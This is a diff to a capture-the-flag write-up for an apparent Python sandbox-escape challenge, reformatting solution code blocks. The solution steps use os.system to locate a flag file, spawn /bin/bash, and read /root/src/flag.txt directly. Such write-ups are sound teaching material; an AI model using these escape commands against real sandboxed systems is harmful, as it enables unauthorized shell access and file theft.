@@ -14,7 +14,13 @@ Instead of accessing a variable, the challenge required participants to break ou
 
 ### Solution
 1. To locate the flag file<br/>
-  ```print(os.system("locate flag.txt"))```
+  ```python
+  print(os.system("locate flag.txt"))
+  ```
 
 2. Gaining root access to the container or directly reading the file<br/>
-  ```print(os.system("/bin/bash"))``` or ```print(os.read(os.open('/root/src/flag.txt', os.O_RDONLY),100))```
+  ```python
+  print(os.system("/bin/bash"))
+  ``` or ```python
+  print(os.read(os.open('/root/src/flag.txt', os.O_RDONLY),100))
+  ```
